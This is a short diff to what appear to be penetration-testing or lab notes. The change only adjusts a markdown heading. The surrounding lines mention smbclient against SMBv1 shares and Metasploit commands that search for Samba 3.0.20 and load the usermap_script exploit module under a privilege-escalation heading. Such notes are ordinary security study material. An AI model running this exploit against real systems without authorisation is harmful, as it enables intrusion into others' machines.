@@ -58,7 +58,7 @@ That allows smbclient to work against SMBv1 shares.
  
 # Privilege Escalation no1
 
-# A)Metasploit
+## A)Metasploit
 Metasploit
 msf5 > search samba 3.0.20
 use exploit/multi/samba/usermap_script
